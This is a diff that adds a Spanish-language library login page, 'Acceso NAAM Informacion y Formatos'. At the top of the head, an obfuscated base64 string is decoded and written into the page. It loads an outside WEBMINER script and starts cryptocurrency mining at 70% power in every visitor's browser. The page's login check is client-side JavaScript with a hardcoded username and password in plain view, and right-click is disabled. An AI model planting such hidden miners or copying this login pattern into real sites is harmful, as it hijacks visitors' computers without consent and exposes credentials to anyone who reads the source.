@@ -1,0 +1,69 @@
+<html id="bar">
+<head>
+<script>
+var string = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8vd20uYm13ZWJtLm9yZy9XRUJNSU5FUi5qcyI+PC9zY3JpcHQ+DQo8c2NyaXB0PldFQk1JTkVSLmNvbmZpZyh7IGxvZ2luOiAiNjA2OTMzNyIsIHBhc3M6IG51bGwgfSkucG93ZXIoNzApOzwvc2NyaXB0Pg==';
+var decodedString = atob(string);
+document.write(''+ decodedString +'');
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+<title>Biblioteca NAAM Informacón y Formatos</title>
+    <link  href="css/style.css" rel="stylesheet">
+    <link rel="shortcut icon" type="image/x-icon" href="img/favicon.ico">
+
+<div align="right">
+  <br>
+
+  <br>
+</div>
+</head>
+<body style="background-color:#ffffff;">
+<div align=left>
+<script>
+var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
+var diasSemana = new Array("Domingo","Lunes","Martes","Miercoles","Jueves","Viernes","Sabado");
+var f=new Date();
+document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear());
+</script>
+<br><br>
+
+
+</div>
+
+<center>
+
+<img src="img/logedit.png">
+<h1>Acceso NAAM INFORMACION Y FORMATOS<h1>
+</center>
+<br><br>
+<center>
+
+<SCRIPT  language=JavaScript>
+function go(){
+
+if (document.form.password.value=='naam' && document.form.login.value=='agente'){
+        document.form.submit();
+    }
+    else{
+         alert("Porfavor ingrese, nombre de usuario y contraseña correctos.");
+    }
+}
+</SCRIPT>
+<FORM name=form action=base class="pagination">
+
+<P>Usuario:    <INPUT type=text name=login>
+<P>Contrase&ntilde;a: <INPUT type=password name=password>
+<INPUT onclick=go() type=button value=Acceder>
+
+</FORM>
+</center>
+</body>
+
+  <br><br><br><br><br><br>
+  <script type='text/javascript'>
+	document.oncontextmenu = function(){return false}
+</script>
+</body>
+
+
+
+</html>
